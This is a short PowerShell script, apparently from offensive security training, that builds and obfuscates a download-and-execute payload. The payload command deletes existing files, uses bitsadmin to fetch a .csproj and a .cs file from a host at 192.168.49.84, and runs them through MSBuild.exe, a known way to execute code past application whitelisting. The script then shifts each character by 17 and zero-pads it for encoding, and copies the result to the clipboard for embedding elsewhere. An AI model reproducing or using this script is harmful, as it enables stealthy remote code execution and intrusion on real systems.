$payload = "cmd /c del %USERPROFILE%\Desktop\msbuild_xml.csproj & del %USERPROFILE%\Desktop\msbuild.cs & bitsadmin /Transfer myJob http://192.168.49.84/msbuild_xml.csproj %USERPROFILE%\Desktop\msbuild_xml.csproj && bitsadmin /Transfer myJob http://192.168.49.84/msbuild.cs %USERPROFILE%\Desktop\msbuild.cs && C:\Windows\Microsoft.NET\Framework\v4.0.30319\MSBuild.exe %USERPROFILE%\Desktop\msbuild_xml.csproj"

[string]$output = ""

$payload.ToCharArray() | %{
    [string]$thischar = [byte][char]$_ + 17
    if($thischar.Length -eq 1)
    {
        $thischar = [string]"00" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 2)
    {
        $thischar = [string]"0" + $thischar
        $output += $thischar
    }
    elseif($thischar.Length -eq 3)
    {
        $output += $thischar
    }
}
$output | clip